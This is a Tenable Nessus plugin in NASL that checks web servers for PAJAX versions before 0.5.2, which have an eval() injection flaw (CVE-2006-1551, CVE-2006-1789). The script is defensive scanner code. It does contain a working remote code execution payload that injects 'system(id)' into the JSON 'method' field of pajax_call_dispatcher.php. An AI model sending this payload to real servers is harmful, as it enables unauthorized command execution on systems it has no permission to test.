#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21227);
  script_version("$Revision: 1.16 $");

  script_cve_id("CVE-2006-1551", "CVE-2006-1789");
  script_bugtraq_id(17519);
  script_osvdb_id(24618, 24862);

  script_name(english:"PAJAX < 0.5.2 Multiple Vulnerabilities");
  script_summary(english:"Tries to execute code using PAJAX");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to
multiple issues." );
 script_set_attribute(attribute:"description", value:
"The remote host is running PAJAX, a PHP library for remote
asynchronous objects in JavaScript. 

The version of PAJAX installed on the remote host fails to validate
input to the 'pajax/pajax_call_dispatcher.php' script before using it
in a PHP 'eval()' function.  An unauthenticated attacker can exploit
this flaw to execute arbitrary command on the remote host subject to
the privileges of the web server user id. 

In addition, the application also reportedly fails to validate input
to classnames before using it in a PHP 'require()' function in
'Pajax.class.php', which allows for local file include attacks." );
 script_set_attribute(attribute:"see_also", value:"http://www.redteam-pentesting.de/advisories/rt-sa-2006-001.txt" );
 script_set_attribute(attribute:"see_also", value:"http://www.auberger.com/pajax/3/" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to PAJAX version 0.5.2 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"metasploit_name", value:'PAJAX Remote Command Execution');
 script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/04/16");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/04/14");
 script_cvs_date("$Date: 2015/09/24 23:21:19 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/pajax", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  url = string(dir, "/pajax/pajax_call_dispatcher.php");

  # Check whether the affected script exists.
  r = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(r)) exit(0, "The web server did not answer");
  res = r[2];

  # If it does...
  if (res == "null")
  {
    # Try to exploit the flaw to run a command.
    cmd = "id";
    postdata = string(
      '{',
        '"id": "ae9b2743a65c11b856f9ad02b12e5183", ',
        '"className": "TestSession", ',
        '"method": "getCount;system(', cmd, ');$obj->getCount", ',
      '}'
    );
    r = http_send_recv3(method:"POST", item:url, version: 11, port: port,
      add_headers: make_array("Content-Type", "text/json"), data: postdata);
    if (isnull(r)) exit(0, "The web server did not answer");
    res = r[2];
    # There's a problem if we see the code in the XML debug output.
    if (egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res))
    {
      if (report_verbosity)
      {
        contents = res - strstr(res, "<br />");
        if (isnull(contents)) contents = res;

        report = string(
          "\n",
          "Nessus was able to execute the command '", cmd, "' on the remote host.\n",
          "It produced the following output :\n",
          "\n",
          contents
        );
        security_hole(port:port, extra:report);
      }
      else security_hole(port);
      exit(0);
    }
  }
}
